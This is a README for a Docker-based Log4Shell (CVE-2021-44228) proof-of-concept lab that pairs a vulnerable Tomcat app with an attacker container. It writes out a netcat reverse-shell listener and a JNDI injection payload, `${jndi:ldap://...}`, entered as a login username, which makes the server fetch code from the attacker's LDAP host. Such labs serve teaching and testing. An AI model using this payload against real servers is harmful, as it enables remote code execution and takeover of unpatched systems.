# log4j-poc

## An LDAP RCE exploit for CVE-2021-44228 Log4Shell

### Description

To demonstrate the log4j vulnerability two separate docker containers will be created. The first one (cve-web) contains a Tomcat 8 server which can be accessed by port 8080. This server has a vulnerable app (log4shell) deployed on it.
The second container (cve-poc) is used to attack the vulnerable server. To communicate with the vulnerable server, it hosts a ldap server.

---

The remote exploit app in this demo is based on that found at <https://github.com/kozmer/log4j-shell-poc>

The RMI exploit against the Tomcat 9 / Java 11 server is described here: <https://www.veracode.com/blog/research/exploiting-jndi-injections-java> (Jan 3, 2019) by Michael Stepankin

### Prerequisites

This code requires Docker and Docker Compose

### Installation

- edit docker-compose.yml file:
  - change value of #LISTENER_ADDR to the local IP of your docker hostmachine
- build docker containers:

```
docker-compose build
```

### Run Web App Attack Demo

- Setup your netcat listener in the first terminal

```
    nc -lv 10.10.10.31 9001
```

- Start the docker containers in a second terminal

```
   docker-compose up
```

- Navigate to <http://10.10.10.31:8080/log4shell>
- Login as "regular" user:
  - Enter the username: `admin`
  - Enter the password: `password`
  - Press the "login" button
- try out log4j vulnerability
  - Return to login at <http://10.10.10.31:8080/log4shell>
  - Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
  - Select the "login" button
  - Check for connection on your `nc` listener
